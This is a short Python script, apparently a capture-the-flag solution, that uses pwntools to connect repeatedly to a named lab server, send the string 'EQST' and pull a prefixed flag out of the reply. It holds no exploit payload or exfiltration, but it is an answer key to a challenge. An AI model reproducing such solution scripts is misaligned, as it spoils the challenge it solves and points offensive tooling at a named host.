import re
from pwn import context, remote

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(host: str, port: str, prefix: str) -> str:
    context.update({"log_level":"error"})
    for _ in range(20):
        with remote(host, port) as rem:
            rem.send(b"EQST")
            flag = get_flag(rem.recvall().strip().decode(), prefix)
            if flag != "": break
    return flag

if __name__ == "__main__":
    host = "lab.eqst.co.kr"
    port = "8166"
    prefix = "EQST"
    print(solution(host, port, prefix))
        